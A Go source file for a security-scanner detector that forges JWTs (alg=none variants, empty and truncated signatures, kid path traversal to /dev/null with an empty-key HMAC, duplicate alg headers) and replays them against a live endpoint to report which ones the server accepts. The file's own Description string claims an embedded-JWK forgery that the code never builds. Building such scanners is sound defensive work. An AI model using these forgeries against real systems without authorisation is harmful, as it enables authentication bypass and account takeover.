package jwtadvanced

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/TyrusRC/assay/internal/core"
	scanhttp "github.com/TyrusRC/assay/internal/http"
)

// Detector replays forged JWTs against a live endpoint and reports any
// forgery the server accepts.
type Detector struct {
	client  *scanhttp.Client
	verbose bool
}

// New constructs a Detector. Nil client makes Detect a no-op.
func New(client *scanhttp.Client) *Detector {
	return &Detector{client: client}
}

// WithVerbose toggles diagnostic output.
func (d *Detector) WithVerbose(v bool) *Detector {
	d.verbose = v
	return d
}

// Name returns the detector identifier.
func (d *Detector) Name() string { return "jwtadvanced" }

// Description returns a one-line summary.
func (d *Detector) Description() string {
	return "Actively replays forged JWTs (alg=none variants, empty signature, kid path traversal, embedded JWK, duplicate alg, truncated signature) against the target and reports any forgery the server accepts."
}

// DetectOptions configures the active probe.
type DetectOptions struct {
	// Token is a known-valid JWT for the target. Required.
	Token string
	// TokenHeader is the Authorization-style header to inject the token
	// into. Defaults to "Authorization" with a "Bearer " prefix.
	TokenHeader string
	// TokenParam, when non-empty, delivers the token as a query
	// parameter of that name instead of via Authorization header.
	// Useful for APIs that accept access_token in the URL.
	TokenParam string
	// Timeout for each probe request.
	Timeout time.Duration
}

// DefaultOptions returns recommended defaults.
func DefaultOptions() DetectOptions {
	return DetectOptions{
		TokenHeader: "Authorization",
		Timeout:     10 * time.Second,
	}
}

// DetectionResult carries findings, the list of accepted forgery
// labels, and the baseline status code for transparency.
type DetectionResult struct {
	Vulnerable        bool
	Findings          []*core.Finding
	BaselineStatus    int
	AcceptedForgeries []string
}

// Detect runs the active forgery campaign.
func (d *Detector) Detect(ctx context.Context, target string, opts DetectOptions) (*DetectionResult, error) {
	res := &DetectionResult{
		Findings:          make([]*core.Finding, 0),
		AcceptedForgeries: make([]string, 0),
	}
	if d == nil || d.client == nil || opts.Token == "" {
		return res, nil
	}
	if opts.TokenHeader == "" && opts.TokenParam == "" {
		opts.TokenHeader = DefaultOptions().TokenHeader
	}
	if opts.Timeout == 0 {
		opts.Timeout = DefaultOptions().Timeout
	}

	// Baseline: send the user's known-good token. If the server doesn't
	// recognize it (4xx) we have no diff signal to work with — bail.
	baseline, err := d.send(ctx, target, opts.Token, opts)
	if err != nil {
		return res, fmt.Errorf("jwtadvanced: baseline: %w", err)
	}
	res.BaselineStatus = baseline
	if baseline >= 400 {
		// No authoritative baseline → can't tell accepted from
		// rejected. Returning no-op is the only safe behavior.
		return res, nil
	}

	for _, attack := range buildForgeries(opts.Token) {
		select {
		case <-ctx.Done():
			return res, ctx.Err()
		default:
		}
		status, err := d.send(ctx, target, attack.token, opts)
		if err != nil {
			continue
		}
		if !accepted(status, baseline) {
			continue
		}
		res.AcceptedForgeries = append(res.AcceptedForgeries, attack.label)
		res.Findings = append(res.Findings, buildFinding(target, attack, baseline, status))
	}

	res.Vulnerable = len(res.Findings) > 0
	return res, nil
}

// accepted treats any 2xx as a successful forgery when the baseline was
// 2xx. A redirect (3xx) following the same trajectory as the baseline
// also counts. Distinct status families mean the server distinguished
// the forgery and rejected it.
func accepted(forgeryStatus, baselineStatus int) bool {
	return statusFamily(forgeryStatus) == statusFamily(baselineStatus)
}

func statusFamily(s int) int { return s / 100 }

// send delivers a single probe. Errors propagate so the caller can skip
// individual forgeries without aborting the campaign.
func (d *Detector) send(ctx context.Context, target, token string, opts DetectOptions) (int, error) {
	reqCtx, cancel := context.WithTimeout(ctx, opts.Timeout)
	defer cancel()

	finalURL := target
	headers := map[string]string{}
	if opts.TokenParam != "" {
		u, err := url.Parse(target)
		if err != nil {
			return 0, fmt.Errorf("parse target: %w", err)
		}
		q := u.Query()
		q.Set(opts.TokenParam, token)
		u.RawQuery = q.Encode()
		finalURL = u.String()
	} else {
		hdr := opts.TokenHeader
		if hdr == "" {
			hdr = "Authorization"
		}
		val := token
		if strings.EqualFold(hdr, "Authorization") {
			val = "Bearer " + token
		}
		headers[hdr] = val
	}

	resp, err := d.client.Do(reqCtx, &scanhttp.Request{
		Method:  "GET",
		URL:     finalURL,
		Headers: headers,
	})
	if err != nil {
		return 0, err
	}
	return resp.StatusCode, nil
}

// forgery pairs a forged token with the human-readable label that
// describes the attack — used as the finding type and AcceptedForgeries
// entry. Severity is graded per attack class.
type forgery struct {
	label       string
	severity    core.Severity
	title       string
	description string
	remediation string
	token       string
}

func buildForgeries(original string) []forgery {
	out := make([]forgery, 0, 8)

	for _, variant := range []string{"none", "None", "NONE", "nOnE"} {
		if tok, ok := mutateHeader(original, map[string]interface{}{"alg": variant}, ""); ok {
			out = append(out, forgery{
				label:       "alg=" + variant,
				severity:    core.SeverityCritical,
				title:       "JWT alg=" + variant + " accepted (signature bypass)",
				description: "The server accepted a JWT whose header advertised alg=" + variant + " and carried no signature. Any attacker can mint arbitrary claims (admin role, target user ID) and authenticate as anyone. CVE-2015-2951 class vulnerability.",
				remediation: "Pin the accepted algorithm server-side. Never honor the alg header from the token — derive it from the verification key. Reject any token whose alg is 'none' (case-insensitive).",
				token:       tok,
			})
		}
	}

	// Empty signature: keep original alg, drop the signature segment.
	if tok, ok := stripSignature(original); ok {
		out = append(out, forgery{
			label:       "empty_signature",
			severity:    core.SeverityCritical,
			title:       "JWT empty signature accepted (verification skipped)",
			description: "The server returned a successful response for a JWT whose signature segment was empty. The verification path either treats missing signatures as 'nothing to verify' or short-circuits when the signature length is zero. Forgery is trivial.",
			remediation: "Require a non-empty signature segment. Treat an empty signature as a fatal validation error, not as 'optional'.",
			token:       tok,
		})
	}

	// kid path traversal to /dev/null with HS256 + empty-key HMAC.
	if tok, ok := kidTraversalToken(original); ok {
		out = append(out, forgery{
			label:       "kid_traversal_dev_null",
			severity:    core.SeverityCritical,
			title:       "JWT kid path traversal accepted (empty-key HMAC bypass)",
			description: "The server resolved the 'kid' header against the filesystem (../../../../../../../../dev/null) and accepted an HMAC signature computed with an empty key — because reading /dev/null returns zero bytes. Authentication is fully forgeable.",
			remediation: "Treat 'kid' as an opaque identifier, never as a filesystem path. Look up keys through a fixed in-memory mapping and reject values containing path separators or traversal sequences.",
			token:       tok,
		})
	}

	// Duplicate alg header — some verifiers honor the first occurrence,
	// some the last, creating parser differentials.
	if tok, ok := duplicateAlgToken(original); ok {
		out = append(out, forgery{
			label:       "duplicate_alg",
			severity:    core.SeverityHigh,
			title:       "JWT duplicate alg header accepted (parser differential)",
			description: "The server accepted a JWT whose header contained two 'alg' fields ('none' followed by the original). Verifiers that select the last occurrence end up using none; verifiers that select the first end up enforcing the original. The mismatch between the policy engine and the cryptographic verifier is exploitable as forgery.",
			remediation: "Reject JWT headers that contain duplicate JSON keys. Most JWT libraries expose a strict-decode mode for this.",
			token:       tok,
		})
	}

	// Truncated signature — drop the last base64 char so the verifier
	// sees a sig one byte shorter than expected. Some libraries fail
	// open on this length mismatch.
	if tok, ok := truncateSignature(original); ok {
		out = append(out, forgery{
			label:       "truncated_signature",
			severity:    core.SeverityHigh,
			title:       "JWT truncated signature accepted",
			description: "The server returned a successful response for a JWT whose signature was truncated by one base64 character. A correct verifier rejects on length mismatch; an exposed library compares only the prefix or skips verification when decoding fails.",
			remediation: "Use a JWT library with constant-time signature comparison and strict length checking. Confirm verification never short-circuits on decode errors.",
			token:       tok,
		})
	}

	return out
}

// buildFinding turns an accepted forgery into a core.Finding.
func buildFinding(target string, atk forgery, baseline, observed int) *core.Finding {
	f := core.NewFinding(atk.title, atk.severity)
	f.Title = atk.title
	f.URL = target
	f.Tool = "jwtadvanced-detector"
	f.Description = atk.description
	f.Evidence = fmt.Sprintf("baseline status: %d, forgery status: %d, forgery: %s", baseline, observed, atk.label)
	f.Remediation = atk.remediation
	f.WithOWASPMapping(
		[]string{"WSTG-ATHN-04"},
		[]string{"A07:2025"},
		[]string{"CWE-287", "CWE-347"},
	)
	return f
}

// mutateHeader rewrites the JWT header with the given key/value
// overrides and replaces the signature with sig. Returns the new token
// or (_, false) if the input is malformed.
func mutateHeader(token string, overrides map[string]interface{}, sig string) (string, bool) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", false
	}
	hBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", false
	}
	var hdr map[string]interface{}
	if err := json.Unmarshal(hBytes, &hdr); err != nil {
		return "", false
	}
	for k, v := range overrides {
		hdr[k] = v
	}
	newH, err := json.Marshal(hdr)
	if err != nil {
		return "", false
	}
	return base64.RawURLEncoding.EncodeToString(newH) + "." + parts[1] + "." + sig, true
}

// stripSignature returns the token with the signature segment cleared
// to the empty string. Header and claims are untouched.
func stripSignature(token string) (string, bool) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", false
	}
	return parts[0] + "." + parts[1] + ".", true
}

// kidTraversalToken builds a forgery with alg=HS256, kid set to a
// path-traversal target, signature segment is the HMAC-SHA256 of the
// message under an empty key. Re-uses the same logic the jwt/ package
// exposes via GenerateKidTraversalToken but keeps the dependency local
// so jwtadvanced/ does not import jwt/ (avoids a cycle through scanner).
func kidTraversalToken(token string) (string, bool) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", false
	}
	hBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", false
	}
	var hdr map[string]interface{}
	if err := json.Unmarshal(hBytes, &hdr); err != nil {
		return "", false
	}
	hdr["alg"] = "HS256"
	hdr["kid"] = "../../../../../../../../dev/null"
	delete(hdr, "jwk")
	delete(hdr, "jku")
	delete(hdr, "x5u")
	newH, err := json.Marshal(hdr)
	if err != nil {
		return "", false
	}
	headerB64 := base64.RawURLEncoding.EncodeToString(newH)
	message := headerB64 + "." + parts[1]
	sig := hmacEmpty(message)
	return message + "." + sig, true
}

// duplicateAlgToken builds a token whose header JSON literally contains
// two "alg" fields. Done by hand because json.Marshal collapses
// duplicate map keys — we need to emit raw JSON.
func duplicateAlgToken(token string) (string, bool) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", false
	}
	hBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", false
	}
	var hdr map[string]interface{}
	if err := json.Unmarshal(hBytes, &hdr); err != nil {
		return "", false
	}
	originalAlg, _ := hdr["alg"].(string)
	if originalAlg == "" {
		originalAlg = "HS256"
	}
	// Build a literal JSON string with alg appearing twice. Order
	// matters: "none" first, then the original. Different libraries
	// pick different occurrences.
	raw := fmt.Sprintf(`{"alg":"none","alg":"%s","typ":"JWT"}`, originalAlg)
	headerB64 := base64.RawURLEncoding.EncodeToString([]byte(raw))
	return headerB64 + "." + parts[1] + ".", true
}

// truncateSignature drops the last byte of the base64 signature. The
// resulting token is almost certainly invalid; the test is whether the
// server short-circuits to "accept" on the decode error.
func truncateSignature(token string) (string, bool) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", false
	}
	if len(parts[2]) < 2 {
		return "", false
	}
	return parts[0] + "." + parts[1] + "." + parts[2][:len(parts[2])-1], true
}

// hmacEmpty returns the base64url HMAC-SHA256 of message under an empty
// key — what the kid-traversal attack relies on.
func hmacEmpty(message string) string {
	h := hmac.New(sha256.New, []byte(""))
	h.Write([]byte(message))
	return base64.RawURLEncoding.EncodeToString(h.Sum(nil))
}
